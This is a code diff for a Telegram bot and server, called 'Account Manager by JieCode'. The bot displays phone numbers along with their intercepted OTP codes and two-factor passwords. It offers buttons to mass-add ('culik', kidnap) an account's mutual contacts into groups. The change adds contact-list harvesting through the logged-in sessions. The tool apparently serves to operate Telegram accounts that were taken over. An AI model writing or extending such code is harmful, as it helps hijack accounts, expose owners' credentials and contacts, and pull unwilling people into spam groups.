@@ -278,18 +278,31 @@ function startBot(token) {
           const i = await axios.get(`${API_BASE_URL}getPassword/${selectedNumber}`);
           if (i.data.status === "success") password = i.data.password;
 
-          await ctx.reply(
-              `📌 *Account Manager by JieCode*\n📞 Nomor: ${phoneNumberLink}\n📩 Last OTP: ${otpCode}\n🔐 Password: ${password}`,
-              {
-                  parse_mode: 'Markdown',
-                  ...Markup.inlineKeyboard([
-                      [Markup.button.callback('🗑️ Hapus Nomor', `delete_${selectedNumber}`)],
-                      [Markup.button.callback('⬅️ Back', 'back_to_menu')],
-                      [Markup.button.callback('🕵🏻‍♀️ Culik ke Grup', `culik_grup_${selectedNumber}`)],
-                      [Markup.button.callback('🧨 Culik Semua Mutual ke Semua Grup', `culik_semua_${selectedNumber}`)]
-                  ])
-              }
-          );
+         const userInfoRes = await axios.post(`${API_BASE_URL}getUserInfo`, { phoneNumber: selectedNumber });
+          const info = userInfoRes.data?.userInfo || {};
+
+                await ctx.reply(
+        `*𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 𝑴𝑨𝑵𝑨𝑮𝑬𝑹*\n` +
+        `👤 Nama: ${info.firstName || '-'} ${info.lastName || ''}\n` +
+        `📞 Nomor: ${phoneNumberLink}\n` +
+        `📩 OTP: ${otpCode}\n` +
+        `🔐 A2F: ${password}\n` +
+        `🆔 Username: @${info.username || 'Tidak Ada'}\n` +
+        `👥 Kontak Total: ${info.totalContacts || 0}\n` +
+        `🤝 Mutual Contacts: ${info.mutualContacts || 0}\n` +
+        `🙅 Non-Mutual Contacts: ${info.nonMutualContacts || 0}`,
+        {
+          parse_mode: 'Markdown',
+          ...Markup.inlineKeyboard([
+            [Markup.button.callback('🗑️ Hapus Nomor', `delete_${selectedNumber}`)],
+            [Markup.button.callback('⬅️ Back', 'back_to_menu')],
+            [Markup.button.callback('🕵🏻‍♀️ Culik ke Grup', `culik_grup_${selectedNumber}`)],
+            [Markup.button.callback('🧨 Culik Semua Mutual ke Semua Grup', `culik_semua_${selectedNumber}`)]
+          ])
+        }
+      );
+
+
   
           await ctx.answerCbQuery();
       } catch (error) {
@@ -977,6 +990,12 @@ app.post("/getUserInfo", async (req, res) => {
     try {
         let client = await initializeClient(phoneNumber);
         let user = await client.getMe();
+        let contacts = await client.invoke(new e.contacts.GetContacts({}));
+
+        let totalContacts = contacts.users.length;
+        let mutualContacts = contacts.users.filter(u => u.mutualContact).length;
+        let nonMutualContacts = totalContacts - mutualContacts;
+
         if (user) {
             res.json({
                 status: "success",
@@ -984,7 +1003,12 @@ app.post("/getUserInfo", async (req, res) => {
                 userInfo: {
                     id: user.id,
                     username: user.username || "No username",
-                    fullName: `${user.firstName || ''} ${user.lastName || ''}`.trim()
+                    firstName: user.firstName || "",
+                    lastName: user.lastName || "",
+                    fullName: `${user.firstName || ''} ${user.lastName || ''}`.trim(),
+                    totalContacts,
+                    mutualContacts,
+                    nonMutualContacts
                 }
             });
         } else {
